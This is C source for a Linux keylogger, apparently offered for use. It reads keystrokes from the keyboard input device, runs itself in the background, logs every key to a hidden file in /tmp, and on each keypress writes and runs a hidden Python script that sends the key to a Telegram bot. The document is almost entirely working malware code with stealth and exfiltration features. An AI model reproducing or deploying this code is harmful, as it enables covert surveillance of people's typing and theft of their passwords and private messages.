// keylogger | C and Python scripting
// keylogger in C that record and write every key in a txt file, managed with python script and sent to telegram chat

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>

#define INPUT_DIR "/dev/input/"
#define EVENT_PREFIX "event"
#define LOG_FILE "/tmp/.keys.log"   // tmp allows silend writing

const char *keymap[] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d", [KEY_E] = "e", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_I] = "i", [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o", [KEY_P] = "p", [KEY_Q] = "q", [KEY_R] = "r",
    [KEY_S] = "s", [KEY_T] = "t", [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z", [KEY_SPACE] = " ", [KEY_ENTER] = "\n", [KEY_BACKSPACE] = "BACKSPACE"
};

// create a python file and auto-run it
void run_python_script(const char *key) {
    FILE *py_file = fopen("/tmp/.runner.py", "w");
    if (!py_file) return;

    fprintf(py_file,
        "#!/usr/bin/env python3\n"
        "import requests\n"
        "import sys\n\n"
        "key = sys.argv[1]\n"       // parse the argument 'key' passed below
        "bot_token = 'xxx'\n"       // insert your bot token
        "chat_id = 'xxx'\n"         // insert your chat id
        "url = f'https://api.telegram.org/bot{bot_token}/sendMessage'\n"
        "data = {\n"
        "    'chat_id': chat_id,\n"
        "    'text': key\n"
        "}\n"
        "try:\n"
        "    requests.post(url, data=data)\n"
        "except:\n"
        "    pass\n"
    );

    fclose(py_file);
    chmod("/tmp/.runner.py", 0755);

    char cmd[512];  // buffer to host the execution command
    snprintf(cmd, sizeof(cmd), "python3 /tmp/.runner.py '%s' &", key);  // insert in
    system(cmd);
}

// check if device is a keyboard
int is_keyboard(const char *device_path){
    char name[256] = "Unknown";     // 256-char buffer to hold keyboard name
    int fd = open(device_path, O_RDONLY);   // try open the device path, return 1 if valid
    if(fd < 0) return 0;
    ioctl(fd, EVIOCGNAME(sizeof(name)), name);  // write in 'name' buffer the keyb. name
    close(fd);
    return (strstr(name, "Keyboard") != NULL || strstr(name, "keyboard") != NULL);
}

// automatically find the keyb. path
char *find_keyboard_device(){
    static char path[512];
    struct dirent *entry;
    DIR *dir = opendir(INPUT_DIR);
    if(!dir) return NULL;
    while((entry = readdir(dir)) != NULL){
        if(strncmp(EVENT_PREFIX, entry->d_name, strlen(EVENT_PREFIX)) == 0){
            snprintf(path, sizeof(path), "%s%s", INPUT_DIR, entry->d_name);
            if(is_keyboard(path)){
                closedir(dir);
                return path;
            }
        }
    }
    closedir(dir);
    return NULL;
}

int main(){
    struct input_event ev;
    FILE *log_file;
    int fd;

    // fork to background
    pid_t pid = fork();
    if(pid < 0) exit(1);
    if(pid > 0) exit(0);    // parent exists
    setsid();   // create a session
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // find the keyb. device
    char *keyboard_path = find_keyboard_device();
    if(!keyboard_path) exit(1);
    fd = open(keyboard_path, O_RDONLY);
    if(fd < 0) exit(1);
    
    log_file = fopen(LOG_FILE, "a");
    if(!log_file){
        close(fd);
        exit(1);
    }

    while(1){
        if(read(fd, &ev, sizeof(struct input_event)) == sizeof(struct input_event)){
            if(ev.type == EV_KEY && ev.value == 1){
                const char *key = keymap[ev.code];
                if(key){
                    fprintf(log_file, "%s", key);
                    fflush(log_file);
                    run_python_script(key);
                }
            }
        }
    }
    fclose(log_file);
    close(fd);
    return 0;
}

// how to stop it:
        // delete the executable
        // 'ps aux | grep executable_name' and take the ps_id
        // sudo kill ps_id
        // delete all hidden log files in /tmp/